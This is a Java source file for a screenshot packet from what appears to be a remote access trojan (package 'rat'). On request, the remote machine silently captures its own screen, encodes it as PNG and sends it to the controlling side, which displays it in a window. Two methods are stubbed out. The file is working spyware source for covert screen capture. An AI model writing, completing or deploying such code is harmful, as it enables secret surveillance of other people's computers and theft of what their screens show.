package de.sogomn.rat.packet;

import java.awt.image.BufferedImage;

import de.sogomn.engine.Screen;
import de.sogomn.engine.Screen.ResizeBehavior;
import de.sogomn.engine.util.ImageUtils;
import de.sogomn.rat.ActiveConnection;
import de.sogomn.rat.util.FrameEncoder;

public final class ScreenshotPacket extends AbstractPingPongPacket {
	
	private BufferedImage image;
	
	private static final BufferedImage NO_IMAGE = new BufferedImage(10, 10, BufferedImage.TYPE_INT_RGB);
	private static final int SCREEN_WIDTH = 800;
	private static final int SCREEN_HEIGHT = 600;
	
	public ScreenshotPacket() {
		type = REQUEST;
		image = NO_IMAGE;
	}
	
	@Override
	protected void sendRequest(final ActiveConnection client) {
		//...
	}
	
	@Override
	protected void sendData(final ActiveConnection client) {
		final byte[] data = ImageUtils.toByteArray(image, "PNG");
		
		client.writeInt(data.length);
		client.write(data);
	}
	
	@Override
	protected void receiveRequest(final ActiveConnection client) {
		//...
	}
	
	@Override
	protected void receiveData(final ActiveConnection client) {
		final int length = client.readInt();
		final byte[] data = new byte[length];
		
		client.read(data);
		
		image = ImageUtils.toImage(data);
		
		if (image == null) {
			image = NO_IMAGE;
		}
	}
	
	@Override
	protected void executeRequest(final ActiveConnection client) {
		type = DATA;
		image = FrameEncoder.takeScreenshot();
		
		if (image == null) {
			image = NO_IMAGE;
		}
		
		client.addPacket(this);
	}
	
	@Override
	protected void executeData(final ActiveConnection client) {
		final int width = image.getWidth();
		final int height = image.getHeight();
		
		final Screen screen = new Screen(width, height);
		
		screen.addListener(g -> {
			g.drawImage(image, 0, 0, null);
		});
		screen.setResizeBehavior(ResizeBehavior.KEEP_ASPECT_RATIO);
		screen.setSize(SCREEN_WIDTH, SCREEN_HEIGHT);
		screen.show();
		screen.redraw();
	}
	
	public BufferedImage getImage() {
		return image;
	}
	
}
